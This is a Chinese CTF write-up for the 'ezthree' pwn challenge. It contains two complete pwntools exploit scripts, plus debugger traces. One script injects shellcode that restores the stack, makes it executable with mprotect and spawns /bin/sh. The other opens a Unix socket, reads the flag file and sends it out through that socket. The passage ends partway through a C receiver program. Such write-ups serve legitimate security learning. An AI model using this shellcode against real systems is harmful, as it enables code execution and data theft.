              <time title="Created: 2022-07-07 20:30:59" itemprop="dateCreated datePublished" datetime="2022-07-07T20:30:59+08:00">2022-07-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-20 09:22:27" itemprop="dateModified" datetime="2022-08-20T09:22:27+08:00">2022-08-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>ezthree 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>)</span> stable release version 2.23, by Roland McGrath et</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ezthree ./ezthree </span><br><span class="line">INput &gt;&gt; yehllow</span><br><span class="line">code &gt; <span class="number">12346</span> </span><br><span class="line">over!!!</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ezthree: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>_amd64/ld<span class="number">-2.23</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=a03fffb75b5c647383a7faca81d76966f05f7564, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p><strong>代码分析</strong></p>
<p>其实前面的代码都没有什么用，关键就是最后可以注入一个 shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( LODWORD(buf[<span class="number">5</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">  output(<span class="string">&quot;You want to do sometings ?\n&quot;</span>);</span><br><span class="line">  read_s((<span class="keyword">char</span> *)shellcode + <span class="number">0xFD8</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode, overlap, <span class="number">0x3D</span>uLL);</span><br><span class="line">  shellcode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但执行该 shellcode 前，需要先执行以下代码：</p>
<p><img src="/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/1656742003103.png" alt="1656742003103"> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xf3e03346000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax rdi <span class="number">0xf3e03346000</span> ◂— <span class="keyword">xor</span>    rax, rax <span class="comment">/* 0xf7894c0bb0c03148 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0xf3e03346008</span> ◂— mov    rsi, r15 <span class="comment">/* 0xc03148050ffe894c */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0xf3e03346010</span> ◂— <span class="keyword">xor</span>    rbx, rbx <span class="comment">/* 0x3148c93148db3148 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0xf3e03346018</span> ◂— ror    byte ptr [rax + <span class="number">0x31</span>], cl <span class="comment">/* 0x48f63148ff3148d2 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0xf3e03346020</span> ◂— <span class="keyword">xor</span>    ebp, ebp <span class="comment">/* 0xc0314de43148ed31 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0xf3e03346028</span> ◂— <span class="keyword">xor</span>    r9, r9 <span class="comment">/* 0x314dd2314dc9314d */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0xf3e03346030</span> ◂— fisttp dword ptr [rbp + <span class="number">0x31</span>] <span class="comment">/* 0x4ded314de4314ddb */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0xf3e03346038</span> ◂— <span class="keyword">xor</span>    esi, esi <span class="comment">/* 0x909090ff314df631 */</span></span><br></pre></td></tr></table></figure>
<p>限制点：常规寄存器全被清空（除了 RIP），尤其是 RSP，导致 shellcode 不能正常执行</p>
<p>漏洞点：第一次 input 可以无限写入数据</p>
<p><strong>入侵思路</strong></p>
<p>在网上借鉴了其他大佬的 wp 后，我发现 <code>mov rsp, fs:[0x300]</code> 这条指令可以恢复栈，我的思路为：</p>
<ul>
<li>利用第一次 input 在栈上留下 execve(“/bin/sh” , 0 , 0) 的汇编代码（第二次 input 不够长）</li>
<li>mprotect(rsp , 0x1000 , 7) 使栈获取执行权限</li>
<li>jmp rsp + jmp $+0x32 执行栈上的 execve(“/bin/sh” , 0 , 0)</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./ezthree&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ezthree&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zero</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;zero&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;nop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movrax</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;movrax&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x185E)\n&quot;)</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		jmp $+0x32</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line">	</span><br><span class="line">shellcode+=<span class="string">&quot;&quot;</span>.ljust(<span class="number">0x30</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov r8 ,rsp</span></span><br><span class="line"><span class="string">        ADD r8 ,0x4b</span></span><br><span class="line"><span class="string">		mov rax, 59</span></span><br><span class="line"><span class="string">		xor rdx, rdx</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">		mov rdi, r8</span></span><br><span class="line"><span class="string">		syscall	</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">		push 0x1000</span></span><br><span class="line"><span class="string">		pop rsi</span></span><br><span class="line"><span class="string">		push 7</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string">		push 0xA</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		and rdi, 0xFFFFFFFFFFFFF000</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		sub rsp,0x67</span></span><br><span class="line"><span class="string">		jmp rsp</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffd20125212</span>    syscall  &lt;SYS_execve&gt;</span><br><span class="line">       path: <span class="number">0x7ffd20125214</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">       argv: <span class="number">0x0</span></span><br><span class="line">       envp: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ni</span><br><span class="line">process <span class="number">8910</span> is executing <span class="keyword">new</span> program: /usr/bin/dash</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x42f10b76fd8</span></span><br><span class="line">Cannot insert breakpoint <span class="number">1.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x559debc0185e</span></span><br></pre></td></tr></table></figure>
<ul>
<li>虽然获取 shell 了，但是有个无法避免的报错</li>
</ul>
<p>直接 get shell 不行，我便想试试 ORW，但又有一个问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">close(<span class="number">0</span>);</span><br><span class="line">close(<span class="number">1</span>);</span><br><span class="line">close(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>close 0 1 2，必然要找其他通信方式</li>
</ul>
<p>网上有一个大佬采用自己创建 socket 管道去通信，orw flag 发送</p>
<p>关于 socket 通信可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010073981/article/details/50734484">Linux socket 本地进程间通信</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff329758b5</span>    syscall  &lt;SYS_socket&gt;</span><br><span class="line">       domain: <span class="number">0x1</span></span><br><span class="line">       type: <span class="number">0x1</span></span><br><span class="line">       protocol: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff329758d5</span>    syscall  &lt;SYS_connect&gt;</span><br><span class="line">       fd: <span class="number">0x0</span> (socket:[<span class="number">159357</span>])</span><br><span class="line">       addr: <span class="number">0x7fff32975889</span> ◂— <span class="number">0x420001</span> <span class="comment">// serv_addr </span></span><br><span class="line">       len: <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
<p>关键点就是 <code>SYS_socket</code> 和 <code>SYS_connect</code> ，执行完这两个函数后，就可以开始 ORW 了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff3297591e</span>    syscall  &lt;SYS_open&gt;</span><br><span class="line">       file: <span class="number">0x7fff32975881</span> ◂— <span class="number">0x67616c66</span> <span class="comment">/* &#x27;flag&#x27; */</span></span><br><span class="line">       oflag: <span class="number">0x0</span></span><br><span class="line">       vararg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff3297592f</span>    syscall  &lt;SYS_read&gt;</span><br><span class="line">       fd: <span class="number">0x1</span> (/home/yhellow/桌面/ezthree/flag)</span><br><span class="line">       buf: <span class="number">0x7fff32975881</span> ◂— <span class="number">0x67616c66</span> <span class="comment">/* &#x27;flag&#x27; */</span></span><br><span class="line">       nbytes: <span class="number">0x50</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff3297593b</span>    syscall  &lt;SYS_write&gt;</span><br><span class="line">       fd: <span class="number">0x0</span> (socket:[<span class="number">159357</span>])</span><br><span class="line">       buf: <span class="number">0x7fff32975881</span> ◂— <span class="string">&#x27;flag&#123;yhellow&#125;\n&#x27;</span></span><br><span class="line">       n: <span class="number">0x50</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/1657196032861.png" alt="1657196032861">  </p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./ezthree&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zero</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;zero&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;nop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movrax</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;movrax&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x185E)&quot;)</span></span><br><span class="line"></span><br><span class="line">serv_addr = <span class="number">0x420001</span> <span class="comment"># serv_addr</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rax, 41</span></span><br><span class="line"><span class="string">		mov rdi, 1</span></span><br><span class="line"><span class="string">		mov rsi, 1</span></span><br><span class="line"><span class="string">		mov rdx, 0</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		push 0</span></span><br><span class="line"><span class="string">		mov rcx, 0x420001</span></span><br><span class="line"><span class="string">		push rcx</span></span><br><span class="line"><span class="string">		mov rsi, rsp</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		mov rax, 42</span></span><br><span class="line"><span class="string">		mov rdx, 0x10</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		jmp $+0x32</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line">	</span><br><span class="line">shellcode+=<span class="string">&quot;b&quot;</span>*<span class="number">0x30</span></span><br><span class="line">	</span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		push 0x67616c66</span></span><br><span class="line"><span class="string">		mov rax, 2</span></span><br><span class="line"><span class="string">		xor rdx, rdx</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		xor rsi, rsi</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		xchg rdi, rax</span></span><br><span class="line"><span class="string">		mov rsi, rsp</span></span><br><span class="line"><span class="string">		mov rdx, 0x50</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		mov rax, 1</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(shellcode+<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">		push 0x1000</span></span><br><span class="line"><span class="string">		pop rsi</span></span><br><span class="line"><span class="string">		push 7</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string">		push 0xA</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		and rdi, 0xFFFFFFFFFFFFF000</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		sub rsp,0x67</span></span><br><span class="line"><span class="string">		jmp rsp</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>用于接收 flag 的脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc recv.c -o recv -g */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span>   </span></span><br><span class="line">   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAN_SERVICE <span class="meta-string">&quot;B&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;      </span><br><span class="line">    <span class="keyword">int</span> ret;     </span><br><span class="line">    <span class="keyword">int</span> len;  </span><br><span class="line">    <span class="keyword">int</span> accept_fd;</span><br><span class="line">    <span class="keyword">int</span> socket_fd; </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> recv_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> clt_addr_len; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">clt_addr</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">srv_addr</span>;</span>  </span><br><span class="line"></span><br><span class="line">    socket_fd=socket(PF_UNIX,SOCK_STREAM,<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(socket_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot create communication socket&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;    </span><br><span class="line">          </span><br><span class="line">    <span class="comment">// 设置服务器参数  </span></span><br><span class="line">    srv_addr.sun_family=AF_UNIX;  </span><br><span class="line">    <span class="built_in">strncpy</span>(srv_addr.sun_path,CAN_SERVICE,<span class="keyword">sizeof</span>(srv_addr.sun_path)<span class="number">-1</span>);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 绑定socket地址 </span></span><br><span class="line">    ret=bind(socket_fd,(struct sockaddr*)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot bind server socket&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 监听   </span></span><br><span class="line">    ret=listen(socket_fd,<span class="number">1</span>);  </span><br><span 